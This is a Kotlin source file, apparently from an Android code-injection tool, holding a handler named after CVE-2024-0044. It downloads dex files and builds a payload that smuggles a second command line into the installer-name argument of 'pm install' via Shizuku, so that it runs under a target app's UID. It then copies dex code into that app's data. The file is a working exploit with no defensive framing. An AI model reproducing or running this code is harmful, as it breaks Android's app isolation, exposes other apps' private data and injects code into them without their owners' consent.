package com.wunelezi.injector.inject

import android.content.Context
import android.content.pm.PackageManager

class CvePmHandler(private val context: Context) : InjectionHandler {

    override fun execute(targetPackage: String, versionSegment: String) {
        val zipFile = DexDownloader.downloadDexZip(context, versionSegment)
        val dexFiles = DexDownloader.extractDexFiles(context, zipFile, versionSegment)
        DexDownloader.writeToWidgetProvider(context, dexFiles)
        DexDownloader.exportAndCopyApk(context)

        val uid = context.packageManager.getApplicationInfo(targetPackage, 0).uid
        val payload = """@null
mcinject $uid 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null""".trimIndent()
        val r = ShizukuExecutor.shell(
            "pm install -i \"\$PAYLOAD\" /data/local/tmp/cve-2024-0044.apk",
            arrayOf("PAYLOAD=$payload")
        )
        if (r.exitCode != 0) {
            throw RuntimeException("pm install 失败 (exit ${r.exitCode}):\n${r.output}")
        }

        DexDownloader.copyDexToTarget(targetPackage, versionSegment)
    }
}
